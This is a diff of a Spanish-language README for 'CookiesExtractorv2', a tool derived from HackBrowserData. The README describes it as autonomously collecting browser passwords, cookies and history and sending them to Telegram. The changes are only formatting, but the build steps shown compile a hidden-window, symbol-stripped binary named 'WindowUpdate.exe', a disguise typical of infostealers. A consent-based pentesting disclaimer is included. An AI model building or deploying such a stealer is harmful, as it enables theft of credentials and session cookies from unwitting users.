@@ -4,7 +4,7 @@ CookiesExtractorv2 es una herramienta desarrollada en Go diseñada para extraer 
 > Advertencia Importante:
 Esta herramienta es una modificación del proyecto original HackBrowserData y ha sido configurada para operar de manera autónoma, recolectando datos de navegación y enviándolos a un destino remoto (Telegram). Su uso implica la extracción y transmisión de información sensible del sistema donde se ejecuta. Esta herramienta está destinada EXCLUSIVAMENTE para fines de investigación de seguridad y pruebas de penetración ÉTICAS en entornos controlados y con el CONSENTIMIENTO EXPLÍCITO Y DOCUMENTADO del propietario del sistema. Cualquier uso no autorizado de este software para acceder, recopilar o exfiltrar datos sin el permiso expreso del propietario del sistema es ILEGAL y NO ÉTICO. El autor y los contribuidores no asumen ninguna responsabilidad legal o moral por cualquier uso indebido o ilegal de esta herramienta.
 
-Navegadores Compatibles
+### Navegadores Compatibles
 
 ### Windows
 | Browser            | Password | Cookie | Bookmark | History |
@@ -89,22 +89,22 @@ const (
 ```
 ###  Navega a la raíz de tu proyecto
 ```bash
-cd CookiesExtractorv2
+$ cd CookiesExtractorv2
 ```
 
 ### Inicializa y limpia tu módulo (si aún no lo has hecho)
 ```bash
-go mod tidy
+$ go mod tidy
 ```
 
 ###  Navega hasta este apartado
 ```bash
-cd cmd\hack-browser-data
+$ cd cmd\hack-browser-data
 ```
 
 ### Compila el ejecutable (desde la raíz del módulo)
 ```bash
-go build -ldflags="-s -w -H=windowsgui" -o WindowUpdate.exe
+$ go build -ldflags="-s -w -H=windowsgui" -o WindowUpdate.exe
 
 ```
 
